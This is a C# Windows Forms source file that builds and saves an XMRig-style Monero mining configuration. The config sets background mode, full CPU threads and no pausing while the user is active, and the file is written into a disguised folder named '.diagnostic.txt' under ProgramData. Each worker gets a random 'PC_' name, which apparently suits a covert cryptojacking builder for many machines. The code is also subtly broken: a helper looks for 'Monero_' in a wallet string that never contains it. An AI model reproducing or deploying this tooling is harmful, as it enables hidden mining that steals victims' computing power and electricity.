using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace doppleganger
{
    public partial class Config : Form
    {
        public Config()
        {
            InitializeComponent();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            server_textbox.Text = "rx-asia.unmineable.com";
        }

        private void Config_Load(object sender, EventArgs e)
        {
            //// Make form completely transparent
            this.Opacity = 0.5;

            // Or make it semi-transparent (0.0 = fully transparent, 1.0 = fully opaque)
            // this.Opacity = 0.5; // 50% transparent
   
        }

            private void config_button_Click(object sender, EventArgs e)
            {
                // Validate user inputs
                if (string.IsNullOrWhiteSpace(wallet_textbox.Text))
                {
                    MessageBox.Show("Please enter a wallet address", "Validation Error",
                                   MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    wallet_textbox.Focus();
                    return;
                }

                if (string.IsNullOrWhiteSpace(server_textbox.Text))
                {
                    MessageBox.Show("Please enter a server address", "Validation Error",
                                   MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    server_textbox.Focus();
                    return;
                }

                try
                {
                    // Get user inputs
                    string userWallet = wallet_textbox.Text.Trim();
                    string server = server_textbox.Text.Trim();

                    // Generate random wallet name suffix
                    string randomSuffix = GenerateRandomString(8);

                    // Construct wallet address with user inputs
                    string walletAddress = $"XMR:{userWallet}.PC_{randomSuffix}#zion-jdc2";

                    var config_json = @"
    {
        ""api"": {
            ""id"": null,
            ""worker-id"": null
        },
        ""http"": {
            ""enabled"": false,
            ""host"": ""127.0.0.1"",
            ""port"": 0,
            ""access-token"": null,
            ""restricted"": true
        },
        ""autosave"": true,
        ""background"": true,
        ""colors"": true,
        ""title"": true,
        ""randomx"": {
            ""init"": -1,
            ""init-avx2"": -1,
            ""mode"": ""auto"",
            ""1gb-pages"": false,
            ""rdmsr"": true,
            ""wrmsr"": true,
            ""cache_qos"": false,
            ""numa"": true,
            ""scratchpad_prefetch_mode"": 1
        },
        ""cpu"": {
            ""enabled"": true,
            ""huge-pages"": true,
            ""huge-pages-jit"": false,
            ""hw-aes"": null,
            ""priority"": null,
            ""memory-pool"": false,
            ""yield"": true,
            ""max-threads-hint"": 100,
            ""asm"": true,
            ""argon2-impl"": null,
            ""cn/0"": false,
            ""cn-lite/0"": false
        },
        ""opencl"": {
            ""enabled"": false,
            ""cache"": true,
            ""loader"": null,
            ""platform"": ""AMD"",
            ""adl"": true,
            ""cn/0"": false,
            ""cn-lite/0"": false
        },
        ""cuda"": {
            ""enabled"": false,
            ""loader"": null,
            ""nvml"": true,
            ""cn/0"": false,
            ""cn-lite/0"": false
        },
        ""donate-level"": 1,
        ""donate-over-proxy"": 1,
        ""log-file"": null,
        ""pools"": [
          {
            ""algo"": ""rx"",
            ""coin"": null,
            ""url"": """ + server + @""",
            ""user"": """ + walletAddress + @""",
            ""pass"": ""x"",
            ""rig-id"": null,
            ""nicehash"": false,
            ""keepalive"": true,
            ""enabled"": true,
            ""tls"": false,
            ""tls-fingerprint"": null,
            ""daemon"": false,
            ""socks5"": null,
            ""self-select"": null,
            ""submit-to-origin"": false
          }
        ],
        ""print-time"": 60,
        ""health-print-time"": 60,
        ""dmi"": true,
        ""retries"": 5,
        ""retry-pause"": 5,
        ""syslog"": false,
        ""tls"": {
            ""enabled"": false,
            ""protocols"": null,
            ""cert"": null,
            ""cert_key"": null,
            ""ciphers"": null,
            ""ciphersuites"": null,
            ""dhparam"": null
        },
        ""dns"": {
            ""ipv6"": false,
            ""ttl"": 30
        },
        ""user-agent"": null,
        ""verbose"": 0,
        ""watch"": true,
        ""pause-on-battery"": false,
        ""pause-on-active"": false
    }";

                // Save to file
                SaveConfigToFile(config_json);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error creating configuration: {ex.Message}",
                               "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private string GenerateRandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var random = new Random();
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private void SaveConfigToFile(string configJson)
        {
            try
            {
                // Create directory if it doesn't exist
                string directoryPath = @"C:\ProgramData\.diagnostic.txt\";

                // Note: The directory name ends with a backslash which is unusual
                // If you want "diagnostic.txt" as a directory name, the path should be:
                // string directoryPath = @"C:\ProgramData\diagnostic.txt\";
                // Or if you want ".diagnostic.txt" as a directory:
                // string directoryPath = @"C:\ProgramData\.diagnostic.txt\";

                // Remove the trailing backslash for Directory.CreateDirectory
                directoryPath = directoryPath.TrimEnd('\\');

                if (!Directory.Exists(directoryPath))
                {
                    Directory.CreateDirectory(directoryPath);
                }

                // Save the config file
                string filePath = Path.Combine(directoryPath, "config.json");
                File.WriteAllText(filePath, configJson);

                // Optional: Show success message
                MessageBox.Show($"Configuration saved to:\n{filePath}\n\nWallet name: {GetWalletNameFromJson(configJson)}",
                               "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error saving configuration: {ex.Message}",
                               "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private string GetWalletNameFromJson(string json)
        {
            try
            {
                // Extract wallet address from JSON
                int userIndex = json.IndexOf("\"user\":");
                if (userIndex > 0)
                {
                    int startQuote = json.IndexOf('"', userIndex + 7);
                    int endQuote = json.IndexOf('"', startQuote + 1);
                    string walletAddress = json.Substring(startQuote + 1, endQuote - startQuote - 1);

                    // Extract the Monero_xxx part
                    int moneroIndex = walletAddress.IndexOf("Monero_");
                    if (moneroIndex > 0)
                    {
                        return walletAddress.Substring(moneroIndex);
                    }
                }
            }
            catch
            {
                // If extraction fails, return generic
            }
            return "Random wallet name generated";
        }
    }
}

